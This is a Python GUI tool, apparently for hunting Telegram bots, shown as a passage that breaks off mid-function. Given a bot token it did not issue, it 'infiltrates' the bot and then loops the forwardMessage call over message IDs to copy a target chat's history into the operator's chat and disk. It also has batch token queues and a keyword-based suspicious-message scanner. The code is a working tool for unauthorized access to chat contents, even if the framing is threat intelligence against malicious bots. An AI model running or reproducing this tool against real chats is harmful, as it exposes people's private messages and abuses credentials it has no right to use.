#!/usr/bin/env python3
"""
Matkap Enhanced - Complete Telegram Bot Hunter with Advanced Features
Version 2.1 - Added custom message ID start option
"""

import tkinter as tk
import tkinter.ttk as ttk
from tkinter import messagebox, simpledialog, filedialog
from tkinter.scrolledtext import ScrolledText
import json
import os
import requests
import asyncio
import threading
from datetime import datetime
from typing import Dict, List, Optional
import hashlib
import re
from collections import Counter

# Telethon imports
from telethon import TelegramClient
from dotenv import load_dotenv

# Optional enhanced features
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import pandas as pd
    PANDAS_AVAILABLE = True
except ImportError:
    PANDAS_AVAILABLE = False

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Load environment variables
load_dotenv()

# Telegram configuration
TELEGRAM_API_URL = "https://api.telegram.org/bot"
env_api_id = os.getenv("TELEGRAM_API_ID", "0")
env_api_hash = os.getenv("TELEGRAM_API_HASH", "")
env_phone_number = os.getenv("TELEGRAM_PHONE", "")

api_id = int(env_api_id) if env_api_id.isdigit() else 0
api_hash = env_api_hash
phone_number = env_phone_number

client = TelegramClient("anon_session", api_id, api_hash, app_version="2.0.1")


class ProfileManager:
    """Profile management system for investigations"""
    
    def __init__(self, profiles_dir="profiles"):
        self.profiles_dir = profiles_dir
        self.current_profile = None
        os.makedirs(profiles_dir, exist_ok=True)
        if CRYPTO_AVAILABLE:
            self.encryption_key = self._get_or_create_key()
        else:
            self.encryption_key = None
        
    def _get_or_create_key(self):
        """Get or create encryption key"""
        if not CRYPTO_AVAILABLE:
            return None
        key_file = os.path.join(self.profiles_dir, ".key")
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key
    
    def save_profile(self, name: str, data: Dict):
        """Save investigation profile"""
        profile = {
            "name": name,
            "created": datetime.now().isoformat(),
            "last_modified": datetime.now().isoformat(),
            "data": data,
            "tags": [],
            "notes": ""
        }
        
        # Encrypt sensitive tokens
        if CRYPTO_AVAILABLE and "bot_token" in data:
            f = Fernet(self.encryption_key)
            profile["data"]["bot_token"] = f.encrypt(data["bot_token"].encode()).decode()
        
        filepath = os.path.join(self.profiles_dir, f"{name}.json")
        with open(filepath, 'w') as f:
            json.dump(profile, f, indent=2)
        return True
    
    def load_profile(self, name: str) -> Optional[Dict]:
        """Load investigation profile"""
        filepath = os.path.join(self.profiles_dir, f"{name}.json")
        if not os.path.exists(filepath):
            return None
            
        with open(filepath, 'r') as f:
            profile = json.load(f)
        
        # Decrypt tokens
        if CRYPTO_AVAILABLE and "bot_token" in profile["data"] and self.encryption_key:
            f = Fernet(self.encryption_key)
            encrypted = profile["data"]["bot_token"].encode()
            profile["data"]["bot_token"] = f.decrypt(encrypted).decode()
        
        return profile
    
    def list_profiles(self) -> List[str]:
        """List all available profiles"""
        profiles = []
        for file in os.listdir(self.profiles_dir):
            if file.endswith('.json'):
                profiles.append(file[:-5])
        return sorted(profiles)
    
    def delete_profile(self, name: str) -> bool:
        """Delete a profile"""
        filepath = os.path.join(self.profiles_dir, f"{name}.json")
        if os.path.exists(filepath):
            os.remove(filepath)
            return True
        return False


class MessageAnalyzer:
    """Advanced message analyzer"""
    
    def __init__(self):
        self.suspicious_patterns = [
            r'(?i)(phishing|scam|fraud|steal)',
            r'(?i)(password|credential|login)',
            r'(?i)(bitcoin|crypto|wallet)',
            r'(?i)(click\s+here|download\s+now)',
            r'https?://[^\s]+\.(tk|ml|ga|cf)',
        ]
        self.url_pattern = re.compile(r'https?://[^\s]+')
        
    def analyze_message(self, message: Dict) -> Dict:
        """Analyze individual message"""
        analysis = {
            "message_id": message.get("message_id"),
            "timestamp": message.get("date"),
            "suspicious_score": 0,
            "flags": [],
            "urls": [],
            "keywords": []
        }
        
        text = str(message.get("text", "")) + " " + str(message.get("caption", ""))
        
        # Check suspicious patterns
        for pattern in self.suspicious_patterns:
            if re.search(pattern, text):
                analysis["suspicious_score"] += 10
                analysis["flags"].append(f"Pattern: {pattern}")
        
        # Extract URLs
        urls = self.url_pattern.findall(text)
        analysis["urls"] = urls
        if urls:
            analysis["suspicious_score"] += len(urls) * 2
        
        # Keyword analysis
        words = text.lower().split()
        word_freq = Counter(words)
        analysis["keywords"] = word_freq.most_common(10)
        
        return analysis
    
    def generate_report(self, messages: List[Dict]) -> Dict:
        """Generate analysis report"""
        report = {
            "generated": datetime.now().isoformat(),
            "total_messages": len(messages),
            "suspicious_count": 0,
            "urls_found": [],
            "high_risk_messages": []
        }
        
        for msg in messages:
            analysis = self.analyze_message(msg)
            if analysis["suspicious_score"] > 5:
                report["suspicious_count"] += 1
            if analysis["suspicious_score"] > 10:
                report["high_risk_messages"].append(analysis)
            report["urls_found"].extend(analysis["urls"])
        
        report["urls_found"] = list(set(report["urls_found"]))
        return report


class MatkapEnhancedGUI:
    """Main GUI Application with all features"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("Matkap Enhanced v2.1 - Telegram Bot Hunter")
        self.root.geometry("1400x850")
        
        # Initialize managers
        self.profile_manager = ProfileManager()
        self.analyzer = MessageAnalyzer()
        self.session = requests.Session()
        
        # Bot state
        self.bot_token = None
        self.bot_username = None
        self.my_chat_id = None
        self.last_message_id = None
        self.stop_flag = False
        self.captured_messages = []
        self.token_queue = []
        
        # Options variables
        self.debug_mode_var = tk.BooleanVar(value=False)
        self.auto_save_var = tk.BooleanVar(value=True)
        self.verify_ssl_var = tk.BooleanVar(value=True)
        
        # Setup GUI
        self.setup_styles()
        self.create_menu()
        self.create_notebook()
        self.create_main_tab()
        self.create_analysis_tab()
        self.create_batch_tab()
        self.create_settings_tab()
        self.create_status_bar()
        
        # Load saved settings
        self.load_settings()
        
    def setup_styles(self):
        """Configure ttk styles"""
        self.style = ttk.Style()
        self.style.theme_use("clam")
        
        # Configure colors
        self.style.configure("Title.TLabel", font=("Arial", 12, "bold"))
        self.style.configure("Success.TLabel", foreground="green")
        self.style.configure("Warning.TLabel", foreground="orange")
        self.style.configure("Error.TLabel", foreground="red")
        self.style.configure("Hunt.TButton", background="#4CAF50")
        
    def create_menu(self):
        """Create menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Load Profile", command=self.load_profile)
        file_menu.add_command(label="Save Profile", command=self.save_profile)
        file_menu.add_separator()
        file_menu.add_command(label="Export Logs", command=self.export_logs)
        file_menu.add_command(label="Export Report", command=self.export_report)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Clear Logs", command=self.clear_logs)
        tools_menu.add_command(label="Clear Session", command=self.clear_session)
        tools_menu.add_separator()
        tools_menu.add_command(label="FOFA Hunt", command=self.fofa_hunt)
        tools_menu.add_command(label="URLScan Hunt", command=self.urlscan_hunt)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        
    def create_notebook(self):
        """Create tabbed interface"""
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=5, pady=5)
        
    def create_main_tab(self):
        """Create main hunting tab"""
        self.main_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.main_tab, text="Hunt")
        
        # Profile section
        profile_frame = ttk.LabelFrame(self.main_tab, text="Profile Management")
        profile_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(profile_frame, text="Profile:").grid(row=0, column=0, padx=5, pady=5)
        self.profile_combo = ttk.Combobox(profile_frame, values=self.profile_manager.list_profiles(), width=30)
        self.profile_combo.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(profile_frame, text="Load", command=self.load_profile).grid(row=0, column=2, padx=5)
        ttk.Button(profile_frame, text="Save", command=self.save_profile).grid(row=0, column=3, padx=5)
        ttk.Button(profile_frame, text="New", command=self.new_profile).grid(row=0, column=4, padx=5)
        ttk.Button(profile_frame, text="Delete", command=self.delete_profile).grid(row=0, column=5, padx=5)
        
        # Bot configuration
        config_frame = ttk.LabelFrame(self.main_tab, text="Bot Configuration")
        config_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(config_frame, text="Bot Token:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.token_entry = ttk.Entry(config_frame, width=50, show="*")
        self.token_entry.grid(row=0, column=1, padx=5, pady=5)
        self.show_token_var = tk.BooleanVar()
        ttk.Checkbutton(config_frame, text="Show", variable=self.show_token_var, 
                       command=self.toggle_token_visibility).grid(row=0, column=2, padx=5)
        
        ttk.Label(config_frame, text="Target Chat ID:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.chatid_entry = ttk.Entry(config_frame, width=50)
        self.chatid_entry.grid(row=1, column=1, padx=5, pady=5)
        
        # Control buttons
        control_frame = ttk.Frame(self.main_tab)
        control_frame.pack(fill="x", padx=10, pady=5)
        
        self.infiltrate_btn = ttk.Button(control_frame, text="1️⃣ Start Attack", 
                                         command=self.start_infiltration, style="Hunt.TButton")
        self.infiltrate_btn.pack(side="left", padx=5)
        
        self.forward_btn = ttk.Button(control_frame, text="2️⃣ Forward Messages", 
                                      command=self.forward_messages)
        self.forward_btn.pack(side="left", padx=5)
        
        self.stop_btn = ttk.Button(control_frame, text="⏹ Stop", command=self.stop_forwarding)
        self.stop_btn.pack(side="left", padx=5)
        
        self.fofa_btn = ttk.Button(control_frame, text="🔍 FOFA Hunt", command=self.fofa_hunt)
        self.fofa_btn.pack(side="left", padx=5)
        
        self.urlscan_btn = ttk.Button(control_frame, text="🔍 URLScan Hunt", command=self.urlscan_hunt)
        self.urlscan_btn.pack(side="left", padx=5)
        
        # Options with Custom Message ID section
        options_frame = ttk.LabelFrame(self.main_tab, text="Options")
        options_frame.pack(fill="x", padx=10, pady=5)
        
        # First row of options
        options_row1 = ttk.Frame(options_frame)
        options_row1.pack(fill="x", padx=5, pady=2)
        
        self.skip_seen_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_row1, text="Skip seen messages", 
                       variable=self.skip_seen_var).pack(side="left", padx=5, pady=5)
        
        self.auto_analyze_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_row1, text="Auto-analyze messages", 
                       variable=self.auto_analyze_var).pack(side="left", padx=5, pady=5)
        
        ttk.Label(options_row1, text="Max messages:").pack(side="left", padx=5)
        self.max_messages_var = tk.StringVar(value="1000")
        ttk.Spinbox(options_row1, from_=100, to=10000, textvariable=self.max_messages_var, 
                   width=10).pack(side="left", padx=5)
        
        # Second row - Custom Message ID Start
        options_row2 = ttk.Frame(options_frame)
        options_row2.pack(fill="x", padx=5, pady=2)
        
        self.use_custom_start_var = tk.BooleanVar(value=False)
        self.custom_start_checkbox = ttk.Checkbutton(
            options_row2, 
            text="Start from custom Message ID:", 
            variable=self.use_custom_start_var,
            command=self.toggle_custom_start
        )
        self.custom_start_checkbox.pack(side="left", padx=5, pady=5)
        
        self.custom_start_entry = ttk.Entry(options_row2, width=15, state="disabled")
        self.custom_start_entry.pack(side="left", padx=5)
        
        ttk.Button(options_row2, text="Get Latest ID", 
                  command=self.set_latest_message_id).pack(side="left", padx=5)
        
        ttk.Label(options_row2, text="(Leave empty to use auto-detected ID)").pack(side="left", padx=5)
        
        # Log area
        log_frame = ttk.LabelFrame(self.main_tab, text="Activity Log")
        log_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.log_text = ScrolledText(log_frame, height=12, wrap="word")
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Configure log tags
        self.log_text.tag_config("info", foreground="black")
        self.log_text.tag_config("success", foreground="green")
        self.log_text.tag_config("warning", foreground="orange")
        self.log_text.tag_config("error", foreground="red")
        self.log_text.tag_config("url", foreground="blue", underline=True)
        
    def create_analysis_tab(self):
        """Create analysis tab"""
        self.analysis_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.analysis_tab, text="📊 Analysis")
        
        # Statistics frame
        stats_frame = ttk.LabelFrame(self.analysis_tab, text="Statistics")
        stats_frame.pack(fill="x", padx=10, pady=5)
        
        self.stats_labels = {}
        stats = ["Total Messages", "Suspicious", "URLs Found", "Files", "Average Risk"]
        for i, stat in enumerate(stats):
            ttk.Label(stats_frame, text=f"{stat}:").grid(row=i//3, column=(i%3)*2, sticky="w", padx=5, pady=2)
            self.stats_labels[stat] = ttk.Label(stats_frame, text="0", style="Success.TLabel")
            self.stats_labels[stat].grid(row=i//3, column=(i%3)*2+1, sticky="w", padx=5, pady=2)
        
        # Control buttons
        control_frame = ttk.Frame(self.analysis_tab)
        control_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Button(control_frame, text="Analyze Captured", command=self.analyze_captured).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Generate Report", command=self.generate_report).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Export IOCs", command=self.export_iocs).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Clear Data", command=self.clear_captured).pack(side="left", padx=5)
        
        # Results area
        results_frame = ttk.LabelFrame(self.analysis_tab, text="Analysis Results")
        results_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Create treeview for results
        columns = ("ID", "Time", "Risk", "Flags", "URLs")
        self.results_tree = ttk.Treeview(results_frame, columns=columns, show="headings", height=15)
        
        for col in columns:
            self.results_tree.heading(col, text=col)
            self.results_tree.column(col, width=100 if col != "Flags" else 300)
        
        # Scrollbars
        vsb = ttk.Scrollbar(results_frame, orient="vertical", command=self.results_tree.yview)
        hsb = ttk.Scrollbar(results_frame, orient="horizontal", command=self.results_tree.xview)
        self.results_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        
        self.results_tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")
        
        results_frame.grid_rowconfigure(0, weight=1)
        results_frame.grid_columnconfigure(0, weight=1)
        
    def create_batch_tab(self):
        """Create batch processing tab"""
        self.batch_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.batch_tab, text="📦 Batch")
        
        # Queue management
        queue_frame = ttk.LabelFrame(self.batch_tab, text="Token Queue")
        queue_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Input frame
        input_frame = ttk.Frame(queue_frame)
        input_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Label(input_frame, text="Add Token:").pack(side="left", padx=5)
        self.batch_token_entry = ttk.Entry(input_frame, width=50)
        self.batch_token_entry.pack(side="left", padx=5)
        ttk.Button(input_frame, text="Add to Queue", command=self.add_to_queue).pack(side="left", padx=5)
        ttk.Button(input_frame, text="Import from File", command=self.import_tokens).pack(side="left", padx=5)
        
        # Queue listbox
        list_frame = ttk.Frame(queue_frame)
        list_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.queue_listbox = tk.Listbox(list_frame, height=10)
        self.queue_listbox.pack(side="left", fill="both", expand=True)
        
        scrollbar = ttk.Scrollbar(list_frame, command=self.queue_listbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.queue_listbox.config(yscrollcommand=scrollbar.set)
        
        # Control buttons
        control_frame = ttk.Frame(queue_frame)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(control_frame, text="Process All", command=self.process_queue).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Remove Selected", command=self.remove_from_queue).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Clear Queue", command=self.clear_queue).pack(side="left", padx=5)
        
        # Progress
        progress_frame = ttk.LabelFrame(self.batch_tab, text="Progress")
        progress_frame.pack(fill="x", padx=10, pady=5)
        
        self.batch_progress = ttk.Progressbar(progress_frame, mode="determinate")
        self.batch_progress.pack(fill="x", padx=5, pady=5)
        
        self.batch_status_label = ttk.Label(progress_frame, text="Ready")
        self.batch_status_label.pack(padx=5, pady=5)
        
    def create_settings_tab(self):
        """Create settings tab"""
        self.settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_tab, text="⚙️ Settings")
        
        # API Settings
        api_frame = ttk.LabelFrame(self.settings_tab, text="API Configuration")
        api_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(api_frame, text="Telegram API ID:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.api_id_entry = ttk.Entry(api_frame, width=30)
        self.api_id_entry.grid(row=0, column=1, padx=5, pady=5)
        self.api_id_entry.insert(0, env_api_id)
        
        ttk.Label(api_frame, text="API Hash:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.api_hash_entry = ttk.Entry(api_frame, width=50, show="*")
        self.api_hash_entry.grid(row=1, column=1, padx=5, pady=5)
        self.api_hash_entry.insert(0, env_api_hash)
        
        ttk.Label(api_frame, text="Phone Number:").grid(row=2, column=0, sticky="w", padx=5, pady=5)
        self.phone_entry = ttk.Entry(api_frame, width=30)
        self.phone_entry.grid(row=2, column=1, padx=5, pady=5)
        self.phone_entry.insert(0, env_phone_number)
        
        ttk.Button(api_frame, text="Save API Settings", command=self.save_api_settings).grid(row=3, column=1, pady=10)
        
        # Advanced Settings
        advanced_frame = ttk.LabelFrame(self.settings_tab, text="Advanced Settings")
        advanced_frame.pack(fill="x", padx=10, pady=5)
        
        self.debug_mode_var = tk.BooleanVar()
        ttk.Checkbutton(advanced_frame, text="Debug Mode", variable=self.debug_mode_var).pack(anchor="w", padx=5, pady=2)
        
        self.auto_save_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="Auto-save captured messages", variable=self.auto_save_var).pack(anchor="w", padx=5, pady=2)
        
        self.verify_ssl_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="Verify SSL certificates", variable=self.verify_ssl_var).pack(anchor="w", padx=5, pady=2)
        
        ttk.Label(advanced_frame, text="Request timeout (seconds):").pack(anchor="w", padx=5, pady=2)
        self.timeout_var = tk.StringVar(value="30")
        ttk.Spinbox(advanced_frame, from_=5, to=120, textvariable=self.timeout_var, width=10).pack(anchor="w", padx=5, pady=2)
        
        # Theme Settings
        theme_frame = ttk.LabelFrame(self.settings_tab, text="Appearance")
        theme_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(theme_frame, text="Theme:").pack(side="left", padx=5, pady=5)
        self.theme_combo = ttk.Combobox(theme_frame, values=["Light", "Dark", "Auto"], width=15)
        self.theme_combo.pack(side="left", padx=5, pady=5)
        self.theme_combo.set("Light")
        
    def create_status_bar(self):
        """Create status bar"""
        self.status_bar = ttk.Frame(self.root)
        self.status_bar.pack(side="bottom", fill="x")
        
        self.status_label = ttk.Label(self.status_bar, text="Ready", relief="sunken")
        self.status_label.pack(side="left", padx=5)
        
        self.connection_label = ttk.Label(self.status_bar, text="Disconnected", relief="sunken")
        self.connection_label.pack(side="right", padx=5)
        
    # Helper methods
    def log(self, message, tag="info"):
        """Add message to log"""
        self.log_text.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n", tag)
        self.log_text.see("end")
        self.update_status(message)
        
    def update_status(self, message):
        """Update status bar"""
        self.status_label.config(text=message[:50])
        
    def toggle_token_visibility(self):
        """Toggle token visibility"""
        if self.show_token_var.get():
            self.token_entry.config(show="")
        else:
            self.token_entry.config(show="*")
    
    def toggle_custom_start(self):
        """Toggle custom start message ID field"""
        if self.use_custom_start_var.get():
            self.custom_start_entry.config(state="normal")
            self.log("Custom Message ID start enabled", "info")
        else:
            self.custom_start_entry.config(state="disabled")
            self.log("Custom Message ID start disabled", "info")
    
    def set_latest_message_id(self):
        """Set the custom start entry to the latest detected message ID"""
        if self.last_message_id:
            self.custom_start_entry.config(state="normal")
            self.custom_start_entry.delete(0, "end")
            self.custom_start_entry.insert(0, str(self.last_message_id))
            self.use_custom_start_var.set(True)
            self.log(f"Set custom start ID to latest: {self.last_message_id}", "success")
        else:
            messagebox.showwarning("No ID", "No message ID detected yet. Run 'Start Attack' first.")
            
    # Profile management
    def load_profile(self):
        """Load selected profile"""
        profile_name = self.profile_combo.get()
        if not profile_name:
            profile_name = simpledialog.askstring("Load Profile", "Enter profile name:")
        
        if profile_name:
            profile = self.profile_manager.load_profile(profile_name)
            if profile:
                data = profile["data"]
                if "bot_token" in data:
                    self.token_entry.delete(0, "end")
                    self.token_entry.insert(0, data["bot_token"])
                if "chat_id" in data:
                    self.chatid_entry.delete(0, "end")
                    self.chatid_entry.insert(0, data["chat_id"])
                self.log(f"✅ Profile '{profile_name}' loaded", "success")
                self.profile_combo.set(profile_name)
            else:
                messagebox.showerror("Error", f"Profile '{profile_name}' not found")
                
    def save_profile(self):
        """Save current configuration as profile"""
        name = simpledialog.askstring("Save Profile", "Enter profile name:")
        if name:
            data = {
                "bot_token": self.token_entry.get(),
                "chat_id": self.chatid_entry.get(),
                "timestamp": datetime.now().isoformat()
            }
            if self.profile_manager.save_profile(name, data):
                self.log(f"✅ Profile '{name}' saved", "success")
                self.profile_combo['values'] = self.profile_manager.list_profiles()
                self.profile_combo.set(name)
                
    def new_profile(self):
        """Clear fields for new profile"""
        self.token_entry.delete(0, "end")
        self.chatid_entry.delete(0, "end")
        self.profile_combo.set("")
        self.log("New profile - fields cleared", "info")
        
    def delete_profile(self):
        """Delete selected profile"""
        profile_name = self.profile_combo.get()
        if profile_name:
            if messagebox.askyesno("Confirm", f"Delete profile '{profile_name}'?"):
                if self.profile_manager.delete_profile(profile_name):
                    self.log(f"Profile '{profile_name}' deleted", "warning")
                    self.profile_combo['values'] = self.profile_manager.list_profiles()
                    self.profile_combo.set("")
                    
    # Bot operations
    def start_infiltration(self):
        """Start bot infiltration"""
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Bot token is required!")
            return
            
        # Clean token
        if token.lower().startswith("bot"):
            token = token[3:]
        
        self.bot_token = token
        self.log("🚀 Starting infiltration...", "info")
        
        # Verify bot
        threading.Thread(target=self._infiltration_process, daemon=True).start()
        
    def _infiltration_process(self):
        """Infiltration process in background"""
        try:
            # Get bot info
            url = f"{TELEGRAM_API_URL}{self.bot_token}/getMe"
            response = self.session.get(url, timeout=10)
            data = response.json()
            
            if data.get("ok"):
                bot_info = data["result"]
                self.bot_username = bot_info.get("username", "Unknown")
                self.root.after(0, lambda: self.log(f"✅ Bot verified: @{self.bot_username}", "success"))
                
                # Send /start command
                self.root.after(0, lambda: self.log("Sending /start command...", "info"))
                asyncio.run(self._send_start_command())
                
                # Get updates
                self.root.after(0, lambda: self.log("Getting updates...", "info"))
                self._get_updates()
                
                # Try to find older messages automatically
                chat_id = self.chatid_entry.get().strip()
                if chat_id and self.last_message_id:
                    self.root.after(0, lambda: self.log(f"🔍 Attempting to find older messages in chat {chat_id}...", "info"))
                    self._try_older_messages(chat_id)
                
                self.root.after(0, lambda: self.connection_label.config(text="Connected"))
            else:
                self.root.after(0, lambda: self.log(f"❌ Bot verification failed: {data.get('description', 'Unknown error')}", "error"))
        except Exception as e:
            self.root.after(0, lambda: self.log(f"❌ Infiltration error: {str(e)}", "error"))
            
    def _try_older_messages(self, chat_id):
        """Try to find and forward older messages"""
        if not self.last_message_id:
            return
            
        found_any = False
        max_attempts = 200  # Try up to 200 older message IDs
        
        self.root.after(0, lambda: self.log(f"🔍 Searching for older messages from ID {self.last_message_id} down to {self.last_message_id - max_attempts}...", "info"))
        
        for test_id in range(self.last_message_id, max(1, self.last_message_id - max_attempts), -1):
            url = f"{TELEGRAM_API_URL}{self.bot_token}/forwardMessage"
            payload = {
                "chat_id": self.my_chat_id,
                "from_chat_id": chat_id,
                "message_id": test_id
            }
            
            try:
                response = self.session.post(url, json=payload, timeout=3)
                data = response.json()
                
                if data.get("ok"):
                    self.root.after(0, lambda m=test_id: self.log(f"✅ Found accessible message at ID {m}!", "success"))
                    found_any = True
                    # Save this message
                    self._save_message(chat_id, test_id, data["result"])
                    if self.auto_analyze_var.get():
                        self.captured_messages.append(data["result"])
                    break  # Found at least one, user can now use Forward Messages for more
            except:
                pass
                
        if found_any:
            self.root.after(0, lambda: self.log("✅ Found accessible messages! You can now use 'Forward Messages' to get more.", "success"))
        else:
            self.root.after(0, lambda: self.log("⚠️ No older messages found in the tested range. The chat might be empty or restricted.", "warning"))
            
    async def _send_start_command(self):
        """Send /start to bot using Telethon"""
        try:
            await client.start(phone_number)
            await client.send_message(f"@{self.bot_username}", "/start")
            await asyncio.sleep(2)
        except Exception as e:
            print(f"Telethon error: {e}")
            
    def _get_updates(self):
        """Get bot updates"""
        try:
            url = f"{TELEGRAM_API_URL}{self.bot_token}/getUpdates"
            response = self.session.get(url, timeout=10)
            data = response.json()
            
            if data.get("ok") and data.get("result"):
                last_update = data["result"][-1]
                if "message" in last_update:
                    msg = last_update["message"]
                    self.my_chat_id = msg["chat"]["id"]
                    self.last_message_id = msg["message_id"]
                    self.root.after(0, lambda: self.log(f"✅ Got chat ID: {self.my_chat_id}, Last message ID: {self.last_message_id}", "success"))
        except Exception as e:
            self.root.after(0, lambda: self.log(f"❌ Failed to get updates: {str(e)}", "error"))
            
    def forward_messages(self):
        """Forward all messages"""
        if not self.bot_token or not self.my_chat_id:
            messagebox.showerror("Error", "Please complete infiltration first!")
            return
            
        chat_id = self.chatid_entry.get().strip()
        if not chat_id:
            messagebox.showerror("Error", "Target chat ID is required!")
            return
        
        # Check if using custom start ID
        start_id = None
        if self.use_custom_start_var.get():
            custom_id_str = self.custom_start_entry.get().strip()
            if custom_id_str:
                try:
                    start_id = int(custom_id_str)
                    self.log(f"📍 Using custom start Message ID: {start_id}", "info")
                except ValueError:
                    messagebox.showerror("Error", "Invalid Message ID! Must be a number.")
                    return
            else:
                messagebox.showwarning("Warning", "Custom start enabled but no ID provided. Using auto-detected ID.")
                start_id = self.last_message_id
        else:
            start_id = self.last_message_id
        
        if not start_id:
            messagebox.showerror("Error", "No starting message ID available. Run infiltration first or specify a custom ID.")
            return
            
        self.stop_flag = False
        self.log("📨 Starting message forwarding...", "info")
        threading.Thread(target=self._forward_process, args=(chat_id, start_id), daemon=True).start()
        
    def _forward_process(self, from_chat_id, start_id):
        """Forward messages in background"""
        try:
            max_messages = int(self.max_messages_var.get())
            success_count = 0
            failed_count = 0
            
            end_id = max(1, start_id - max_messages)
            
            self.root.after(0, lambda: self.log(f"📝 Attempting to forward messages from ID {start_id} down to {end_id}", "info"))
            self.root.after(0, lambda: self.log(f"📝 Target chat ID: {from_chat_id}", "info"))
            
            # Try messages in reverse order (newest to oldest)
            for msg_id in range(start_id, end_id - 1, -1):
                if self.stop_flag:
                    self.root.after(0, lambda: self.log(f"⏹ Stopped at message ID {msg_id}", "warning"))
                    break
                    
                # Skip seen messages if option is enabled
                if self.skip_seen_var.get() and self._is_message_seen(from_chat_id, msg_id):
                    continue
                    
                # Forward message
                url = f"{TELEGRAM_API_URL}{self.bot_token}/forwardMessage"
                payload = {
                    "chat_id": self.my_chat_id,
                    "from_chat_id": from_chat_id,
                    "message_id": msg_id
                }
                
                try:
                    response = self.session.post(url, json=payload, timeout=5)
                    data = response.json()
                    
                    if data.get("ok"):
                        success_count += 1
                        self._save_message(from_chat_id, msg_id, data["result"])
                        self.root.after(0, lambda m=msg_id: self.log(f"✅ Forwarded message {m}", "success"))
                        
                        # Auto-analyze if enabled
                        if self.auto_analyze_var.get():
                            self.captured_messages.append(data["result"])
                    else:
                        failed_count += 1
                        # Log specific error for debugging
                        error_desc = data.get("description", "Unknown error")
                        if "message not found" not in error_desc.lower():
                            self.root.after(0, lambda e=error_desc, m=msg_id: self.log(f"⚠️ Failed to forward {m}: {e}", "warning"))
                except Exception as e:
                    failed_count += 1
                    if self.debug_mode_var.get():
                        self.root.after(0, lambda err=str(e), m=msg_id: self.log(f"❌ Error forwarding {m}: {err}", "error"))
                    
            attempted = start_id - end_id + 1
            self.root.after(0, lambda: self.log(f"✅ Forwarding complete! Success: {success_count}/{attempted} (Failed: {failed_count})", "success"))
            
        except Exception as e:
            self.root.after(0, lambda: self.log(f"❌ Forward error: {str(e)}", "error"))
            
    def stop_forwarding(self):
        """Stop forwarding process"""
        self.stop_flag = True
        self.log("⏹ Stopping forwarding...", "warning")
        
    def _is_message_seen(self, chat_id, msg_id):
        """Check if message was already seen"""
        filename = f"captured_messages/bot_{self.bot_token[:8]}_chat_{chat_id}_seen.txt"
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                seen_ids = f.read().splitlines()
                return str(msg_id) in seen_ids
        return False
        
    def _save_message(self, chat_id, msg_id, message_data):
        """Save forwarded message"""
        if not self.auto_save_var.get():
            return
            
        os.makedirs("captured_messages", exist_ok=True)
        
        # Save message ID as seen
        seen_file = f"captured_messages/bot_{self.bot_token[:8]}_chat_{chat_id}_seen.txt"
        with open(seen_file, 'a') as f:
            f.write(f"{msg_id}\n")
            
        # Save message data
        data_file = f"captured_messages/bot_{self.bot_token[:8]}_chat_{chat_id}_messages.json"
        messages = []
        if os.path.exists(data_file):
            with open(data_file, 'r') as f:
                messages = json.load(f)
        messages.append(message_data)
        with open(data_file, 'w') as f:
            json.dump(messages, f, indent=2)
            
    # Analysis methods
    def analyze_captured(self):
        """Analyze captured messages"""
        if not self.captured_messages:
            messagebox.showinfo("Info", "No messages to analyze")
            return
            
        self.log("🔍 Analyzing messages...", "info")
        
        # Clear previous results
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
            
        # Analyze each message
        total_suspicious = 0
